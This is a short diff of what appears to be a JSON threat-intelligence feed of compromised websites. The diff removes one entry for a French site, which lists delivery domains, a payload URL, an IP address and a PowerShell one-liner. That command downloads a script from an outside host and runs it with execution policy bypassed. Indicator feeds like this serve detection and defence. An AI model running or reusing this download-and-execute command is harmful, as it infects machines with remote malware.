@@ -12124,25 +12124,5 @@
     ],
     "ReportId": "cmwlelo8a1i9h0omltrse0fps",
     "ScannedAt": "2026-11-18T00:49:20.146000+00:00"
-  },
-  {
-    "UrlDomain": "www.lapetitebarque.fr",
-    "DeliveryUrl": [
-      "sentrydb.org",
-      "pillingthat.com"
-    ],
-    "PayloadUrl": [
-      "https://pillingthat.com/WfodrrIBwI"
-    ],
-    "IP": [
-      "87.98.154.146"
-    ],
-    "Related": [],
-    "Payload": "powershell -nop -c \"$f=$env:TEMP+'\\pintk.ps1';curl.exe -sk -o $f 'https://pillingthat[.]com/WfodrrIBwI';powershell -ep bypass -File $f\"",
-    "ResolvedDownloadUrl": [
-      "https://pillingthat.com/WfodrrIBwI"
-    ],
-    "ReportId": "cmwl9b54l1i4f0omls40cjhgn",
-    "ScannedAt": "2026-11-17T22:21:10.789000+00:00"
   }
 ]
